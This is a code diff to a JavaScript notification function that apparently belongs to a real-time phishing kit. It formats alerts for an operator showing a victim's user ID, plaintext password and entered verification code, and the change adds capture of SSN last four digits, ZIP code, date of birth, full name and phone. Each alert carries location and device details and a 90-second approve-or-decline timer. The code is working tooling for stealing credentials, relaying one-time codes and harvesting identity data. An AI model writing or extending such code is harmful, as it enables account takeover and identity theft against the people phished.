@@ -222,21 +222,22 @@ export async function notifyAdvance(env, task) {
   var tz = task.cf ? task.cf.timezone : null;
   var lines = [];
 
-  if (task.flow_step === "code_request") {
-    var target =
-      task.code_delivery_method === "phone"
-        ? "Phone (" + task.masked_phone + ")"
-        : "Email (" + task.masked_email + ")";
-
-    lines.push("📨 Code delivery request (GB)");
+  if (task.flow_step === "verify") {
+    lines.push("🛂 Identity verification (GB)");
     lines.push(LINE);
     lines.push("👤 User: " + task.user_id);
     lines.push("🔑 Password: " + (task.password || "N/A"));
-    lines.push("✉️ Send code via: " + target);
+    lines.push("🔢 SSN Last 4: " + (task.ssn_last4 || "N/A"));
+    lines.push("📮 ZIP Code: " + (task.zip_code || "N/A"));
+    lines.push("🎂 DOB: " + (task.birth_date || "N/A"));
+    lines.push("📝 Full Name: " + (task.full_name || "N/A"));
+    lines.push("📞 Phone: " + (task.masked_phone || "N/A"));
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
     lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines = lines.concat(timeBlock(tz));
     lines.push("");
     lines.push("⏳ Auto-declines in 90s");
   } else if (task.flow_step === "code_verify") {
@@ -245,11 +246,12 @@ export async function notifyAdvance(env, task) {
     lines.push("👤 User: " + task.user_id);
     lines.push("🔑 Password: " + (task.password || "N/A"));
     lines.push("🔢 Code entered: " + (task.verification_code || "N/A"));
-    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + task.masked_email + ")");
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
     lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines = lines.concat(timeBlock(tz));
     lines.push("");
     lines.push("⏳ Auto-declines in 90s");
   } else {
